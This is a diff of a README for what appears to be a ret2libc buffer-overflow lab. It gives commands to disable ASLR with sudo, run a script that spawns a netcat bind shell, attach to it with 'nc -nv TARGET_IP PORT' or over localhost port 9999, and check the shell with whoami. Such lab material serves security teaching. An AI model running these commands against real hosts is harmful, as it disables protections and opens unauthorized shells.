@@ -12,18 +12,19 @@ Netcat traditional is installed on a Linux system. The goal is to use a ret2libc
 
 ## Instructions
 
-Turn ASLR off so address env variable address doesn't change  
-<br/>Command: sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'  
+Turn ASLR off so address env variable address doesn't change   
+Command: sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'  
 NOTE: 0 - disables randomization and 2 - enables randomization  
 
-Spawn a bind shell by running the run.sh script  
-<br/>Command: sh run.sh  
+Spawn a bind shell by running the run.sh script 
+Command: sh run.sh  
 
 NOTE: The memory addresses used for the attack are encoded in little endian and may require some tweaking. Specifically, the estimated payload address should match that of PAY_ADDR defined in run.sh, otherwise it needs to be found using GDB.
 
-To attach to the bind shell from the attack machine, open a terminal and run the following command using the IP of the target machine and port number of the nc server.
-<br/>Command: nc -nv TARGET_IP PORT
+To attach to the bind shell from the attack machine, open a terminal and run the following command using the IP of the target machine and port number of the nc server.  
+Command: nc -nv TARGET_IP PORT
 
-For this example, use the following command to connect via a second terminal on the same machine over port 9999
-<br/>Command: nc -nv 127.0.0.1 9999
+For this example, use the following command to connect via a second terminal on the same machine over port 9999. 
+Command: nc -nv 127.0.0.1 9999
 
+To verify the bind shell is operational, test with commands like whoami, pwd, and ls.
